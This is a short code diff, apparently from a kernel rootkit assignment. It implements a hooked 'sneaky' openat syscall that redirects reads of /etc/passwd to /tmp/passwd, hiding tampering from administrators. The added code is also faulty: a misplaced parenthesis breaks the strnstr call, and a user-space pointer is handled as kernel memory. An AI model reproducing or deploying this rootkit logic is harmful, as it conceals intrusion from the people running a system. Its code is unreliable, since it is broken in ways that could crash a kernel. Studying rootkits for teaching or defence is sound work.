@@ -42,8 +42,9 @@ asmlinkage ssize_t (*original_read)(struct pt_regs *);
 // Define your new sneaky version of the 'openat' syscall
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
     // Implement the sneaky part here
-
-
+    if (strnstr(regs->si, "/etc/passwd", strlen("/etc/passwd") != NULL)) {
+        copy_to_user(regs->si, "/tmp/passwd", strlen("/tmp/passwd"));
+    }
 
     return (*original_openat)(regs);
 }
